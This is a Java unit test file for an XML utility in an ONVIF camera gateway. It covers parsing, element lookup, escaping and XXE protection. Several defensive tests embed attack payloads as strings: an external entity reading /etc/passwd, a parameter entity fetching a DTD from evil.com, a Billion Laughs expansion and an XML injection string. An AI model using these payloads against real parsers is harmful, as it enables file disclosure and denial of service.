package com.gaskony.camera.gateway.onvif.util;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

import static org.assertj.core.api.Assertions.*;

/**
 * Unit tests for XmlUtil.
 * Tests XML parsing, XXE protection, and DOM navigation utilities.
 */
class XmlUtilTest {

    // ==================== Basic XML Parsing Tests ====================

    @Test
    void testParseXml_ValidXml() throws Exception {
        String xml = "<?xml version=\"1.0\"?><root><child>value</child></root>";

        Document doc = XmlUtil.parseXml(xml);

        assertThat(doc).isNotNull();
        assertThat(doc.getDocumentElement().getTagName()).isEqualTo("root");
    }

    @Test
    void testParseXml_WithNamespace() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root xmlns:test=\"http://example.com/test\">" +
            "<test:child>value</test:child>" +
            "</root>";

        Document doc = XmlUtil.parseXml(xml);

        assertThat(doc).isNotNull();
        assertThat(doc.getDocumentElement().getLocalName()).isEqualTo("root");
    }

    @Test
    void testParseXml_InvalidXml() {
        String invalidXml = "<?xml version=\"1.0\"?><root><child>value</root>";

        assertThatThrownBy(() -> XmlUtil.parseXml(invalidXml))
            .isInstanceOf(Exception.class);
    }

    @Test
    void testParseXml_EmptyXml() {
        String emptyXml = "";

        assertThatThrownBy(() -> XmlUtil.parseXml(emptyXml))
            .isInstanceOf(Exception.class);
    }

    // ==================== XXE Protection Tests ====================

    @Test
    void testParseXml_XXE_ExternalEntity_Blocked() {
        // Attempt to define and use external entity (XXE attack)
        String xxeXml = "<?xml version=\"1.0\"?>" +
            "<!DOCTYPE root [" +
            "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">" +
            "]>" +
            "<root>&xxe;</root>";

        // Should throw exception due to DOCTYPE being disallowed
        assertThatThrownBy(() -> XmlUtil.parseXml(xxeXml))
            .isInstanceOf(Exception.class)
            .hasMessageContaining("DOCTYPE");
    }

    @Test
    void testParseXml_XXE_ParameterEntity_Blocked() {
        // Attempt parameter entity attack
        String xxeXml = "<?xml version=\"1.0\"?>" +
            "<!DOCTYPE root [" +
            "<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">" +
            "%xxe;" +
            "]>" +
            "<root>test</root>";

        // Should throw exception due to DOCTYPE being disallowed
        assertThatThrownBy(() -> XmlUtil.parseXml(xxeXml))
            .isInstanceOf(Exception.class)
            .hasMessageContaining("DOCTYPE");
    }

    @Test
    void testParseXml_XXE_BillionLaughsAttack_Blocked() {
        // Billion Laughs attack (entity expansion)
        String xxeXml = "<?xml version=\"1.0\"?>" +
            "<!DOCTYPE root [" +
            "<!ENTITY lol \"lol\">" +
            "<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">" +
            "]>" +
            "<root>&lol2;</root>";

        // Should throw exception due to DOCTYPE being disallowed
        assertThatThrownBy(() -> XmlUtil.parseXml(xxeXml))
            .isInstanceOf(Exception.class)
            .hasMessageContaining("DOCTYPE");
    }

    // ==================== Text Content Tests ====================

    @Test
    void testGetTextContent_ExistingElement() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root>" +
            "<manufacturer>Axis</manufacturer>" +
            "<model>P3225-LVE</model>" +
            "</root>";

        Document doc = XmlUtil.parseXml(xml);

        assertThat(XmlUtil.getTextContent(doc, "manufacturer")).hasValue("Axis");
        assertThat(XmlUtil.getTextContent(doc, "model")).hasValue("P3225-LVE");
    }

    @Test
    void testGetTextContent_NonExistingElement() throws Exception {
        String xml = "<?xml version=\"1.0\"?><root><child>value</child></root>";

        Document doc = XmlUtil.parseXml(xml);

        assertThat(XmlUtil.getTextContent(doc, "nonexistent")).isEmpty();
    }

    @Test
    void testGetTextContent_WithDefaultValue() throws Exception {
        String xml = "<?xml version=\"1.0\"?><root><child>value</child></root>";

        Document doc = XmlUtil.parseXml(xml);

        assertThat(XmlUtil.getTextContent(doc, "child", "default")).isEqualTo("value");
        assertThat(XmlUtil.getTextContent(doc, "nonexistent", "default")).isEqualTo("default");
    }

    @Test
    void testGetTextContent_EmptyElement() throws Exception {
        String xml = "<?xml version=\"1.0\"?><root><empty></empty></root>";

        Document doc = XmlUtil.parseXml(xml);

        assertThat(XmlUtil.getTextContent(doc, "empty")).hasValue("");
    }

    @Test
    void testGetTextContent_WithNamespace() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root xmlns:test=\"http://example.com\">" +
            "<test:manufacturer>Hikvision</test:manufacturer>" +
            "</root>";

        Document doc = XmlUtil.parseXml(xml);

        // Should find element by local name regardless of namespace
        assertThat(XmlUtil.getTextContent(doc, "manufacturer")).hasValue("Hikvision");
    }

    // ==================== Child Element Tests ====================

    @Test
    void testGetChildTextContent_ExistingChild() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root>" +
            "<parent>" +
            "<child1>value1</child1>" +
            "<child2>value2</child2>" +
            "</parent>" +
            "</root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildTextContent(parent, "child1")).hasValue("value1");
        assertThat(XmlUtil.getChildTextContent(parent, "child2")).hasValue("value2");
    }

    @Test
    void testGetChildTextContent_NonExistingChild() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root><parent><child>value</child></parent></root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildTextContent(parent, "nonexistent")).isEmpty();
    }

    @Test
    void testGetChildTextContent_WithDefaultValue() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root><parent><child>value</child></parent></root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildTextContent(parent, "child", "default")).isEqualTo("value");
        assertThat(XmlUtil.getChildTextContent(parent, "nonexistent", "default")).isEqualTo("default");
    }

    // ==================== Find Element Tests ====================

    @Test
    void testFindElement_InDocument() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root>" +
            "<manufacturer>Dahua</manufacturer>" +
            "<model>DH-IPC</model>" +
            "</root>";

        Document doc = XmlUtil.parseXml(xml);

        assertThat(XmlUtil.findElement(doc, "manufacturer")).isPresent();
        assertThat(XmlUtil.findElement(doc, "model")).isPresent();
        assertThat(XmlUtil.findElement(doc, "nonexistent")).isEmpty();
    }

    @Test
    void testFindElement_InParent() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root>" +
            "<parent>" +
            "<child1>value1</child1>" +
            "<child2>value2</child2>" +
            "</parent>" +
            "</root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.findElement(parent, "child1")).isPresent();
        assertThat(XmlUtil.findElement(parent, "child2")).isPresent();
        assertThat(XmlUtil.findElement(parent, "nonexistent")).isEmpty();
    }

    // ==================== Integer Parsing Tests ====================

    @Test
    void testGetChildIntContent_ValidInteger() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root>" +
            "<parent>" +
            "<width>1920</width>" +
            "<height>1080</height>" +
            "</parent>" +
            "</root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildIntContent(parent, "width")).hasValue(1920);
        assertThat(XmlUtil.getChildIntContent(parent, "height")).hasValue(1080);
    }

    @Test
    void testGetChildIntContent_InvalidInteger() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root><parent><value>not-a-number</value></parent></root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildIntContent(parent, "value")).isEmpty();
    }

    @Test
    void testGetChildIntContent_NonExistingElement() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root><parent><value>123</value></parent></root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildIntContent(parent, "nonexistent")).isEmpty();
    }

    // ==================== Double Parsing Tests ====================

    @Test
    void testGetChildDoubleContent_ValidDouble() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root>" +
            "<parent>" +
            "<pan>0.5</pan>" +
            "<tilt>-0.25</tilt>" +
            "<zoom>1.0</zoom>" +
            "</parent>" +
            "</root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildDoubleContent(parent, "pan")).hasValue(0.5);
        assertThat(XmlUtil.getChildDoubleContent(parent, "tilt")).hasValue(-0.25);
        assertThat(XmlUtil.getChildDoubleContent(parent, "zoom")).hasValue(1.0);
    }

    @Test
    void testGetChildDoubleContent_InvalidDouble() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root><parent><value>not-a-number</value></parent></root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildDoubleContent(parent, "value")).isEmpty();
    }

    @Test
    void testGetChildDoubleContent_NonExistingElement() throws Exception {
        String xml = "<?xml version=\"1.0\"?>" +
            "<root><parent><value>1.5</value></parent></root>";

        Document doc = XmlUtil.parseXml(xml);
        Element parent = XmlUtil.findElement(doc, "parent").orElseThrow();

        assertThat(XmlUtil.getChildDoubleContent(parent, "nonexistent")).isEmpty();
    }

    // ==================== XML Escaping Tests ====================

    @Test
    void testEscapeXml_SpecialCharacters() {
        assertThat(XmlUtil.escapeXml("test")).isEqualTo("test");
        assertThat(XmlUtil.escapeXml("test<value>")).isEqualTo("test&lt;value&gt;");
        assertThat(XmlUtil.escapeXml("test & value")).isEqualTo("test &amp; value");
        assertThat(XmlUtil.escapeXml("test \"quoted\"")).isEqualTo("test &quot;quoted&quot;");
        assertThat(XmlUtil.escapeXml("test 'quoted'")).isEqualTo("test &apos;quoted&apos;");
    }

    @Test
    void testEscapeXml_AllSpecialCharacters() {
        String input = "<>&\"'";
        String expected = "&lt;&gt;&amp;&quot;&apos;";
        assertThat(XmlUtil.escapeXml(input)).isEqualTo(expected);
    }

    @Test
    void testEscapeXml_NullInput() {
        assertThat(XmlUtil.escapeXml(null)).isEqualTo("");
    }

    @Test
    void testEscapeXml_EmptyInput() {
        assertThat(XmlUtil.escapeXml("")).isEqualTo("");
    }

    @Test
    void testEscapeXml_PreventXmlInjection() {
        String maliciousInput = "</token><injected>evil</injected><token>";
        String escaped = XmlUtil.escapeXml(maliciousInput);

        assertThat(escaped).isEqualTo("&lt;/token&gt;&lt;injected&gt;evil&lt;/injected&gt;&lt;token&gt;");
        assertThat(escaped).doesNotContain("<");
        assertThat(escaped).doesNotContain(">");
    }

    @Test
    void testEscapeXmlAttribute_SpecialCharacters() {
        assertThat(XmlUtil.escapeXmlAttribute("test")).isEqualTo("test");
        assertThat(XmlUtil.escapeXmlAttribute("test<value>")).isEqualTo("test&lt;value&gt;");
        assertThat(XmlUtil.escapeXmlAttribute("test & value")).isEqualTo("test &amp; value");
        assertThat(XmlUtil.escapeXmlAttribute("test \"quoted\"")).isEqualTo("test &quot;quoted&quot;");
    }

    // ==================== Real ONVIF Response Tests ====================

    @Test
    void testParseXml_ONVIFDeviceInformationResponse() throws Exception {
        String onvifResponse = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://www.w3.org/2003/05/soap-envelope\">" +
            "<SOAP-ENV:Body>" +
            "<tds:GetDeviceInformationResponse xmlns:tds=\"http://www.onvif.org/ver10/device/wsdl\">" +
            "<tds:Manufacturer>Axis Communications AB</tds:Manufacturer>" +
            "<tds:Model>AXIS P3225-LVE</tds:Model>" +
            "<tds:FirmwareVersion>9.80.1</tds:FirmwareVersion>" +
            "<tds:SerialNumber>ACCC8E123456</tds:SerialNumber>" +
            "<tds:HardwareId>123</tds:HardwareId>" +
            "</tds:GetDeviceInformationResponse>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";

        Document doc = XmlUtil.parseXml(onvifResponse);

        assertThat(XmlUtil.getTextContent(doc, "Manufacturer")).hasValue("Axis Communications AB");
        assertThat(XmlUtil.getTextContent(doc, "Model")).hasValue("AXIS P3225-LVE");
        assertThat(XmlUtil.getTextContent(doc, "FirmwareVersion")).hasValue("9.80.1");
        assertThat(XmlUtil.getTextContent(doc, "SerialNumber")).hasValue("ACCC8E123456");
        assertThat(XmlUtil.getTextContent(doc, "HardwareId")).hasValue("123");
    }

    @Test
    void testParseXml_ONVIFMediaProfileResponse() throws Exception {
        String onvifResponse = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://www.w3.org/2003/05/soap-envelope\">" +
            "<SOAP-ENV:Body>" +
            "<trt:GetProfilesResponse xmlns:trt=\"http://www.onvif.org/ver10/media/wsdl\">" +
            "<trt:Profiles token=\"000\">" +
            "<tt:Name xmlns:tt=\"http://www.onvif.org/ver10/schema\">Main Profile</tt:Name>" +
            "<tt:VideoEncoderConfiguration xmlns:tt=\"http://www.onvif.org/ver10/schema\">" +
            "<tt:Encoding>H264</tt:Encoding>" +
            "<tt:Resolution>" +
            "<tt:Width>1920</tt:Width>" +
            "<tt:Height>1080</tt:Height>" +
            "</tt:Resolution>" +
            "</tt:VideoEncoderConfiguration>" +
            "</trt:Profiles>" +
            "</trt:GetProfilesResponse>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";

        Document doc = XmlUtil.parseXml(onvifResponse);

        assertThat(XmlUtil.getTextContent(doc, "Name")).hasValue("Main Profile");
        assertThat(XmlUtil.getTextContent(doc, "Encoding")).hasValue("H264");
        assertThat(XmlUtil.getTextContent(doc, "Width")).hasValue("1920");
        assertThat(XmlUtil.getTextContent(doc, "Height")).hasValue("1080");
    }

    // ==================== Edge Cases ====================

    @Test
    void testParseXml_LargeDocument() throws Exception {
        StringBuilder sb = new StringBuilder("<?xml version=\"1.0\"?><root>");
        for (int i = 0; i < 1000; i++) {
            sb.append("<item>value").append(i).append("</item>");
        }
        sb.append("</root>");

        Document doc = XmlUtil.parseXml(sb.toString());

        assertThat(doc).isNotNull();
        // Should have at least 1000 child nodes (may include text nodes)
        assertThat(doc.getDocumentElement().getChildNodes().getLength()).isGreaterThanOrEqualTo(1000);
    }

    @Test
    void testParseXml_DeeplyNested() throws Exception {
        StringBuilder sb = new StringBuilder("<?xml version=\"1.0\"?>");
        for (int i = 0; i < 100; i++) {
            sb.append("<level").append(i).append(">");
        }
        sb.append("deep value");
        for (int i = 99; i >= 0; i--) {
            sb.append("</level").append(i).append(">");
        }

        Document doc = XmlUtil.parseXml(sb.toString());

        assertThat(doc).isNotNull();
    }
}
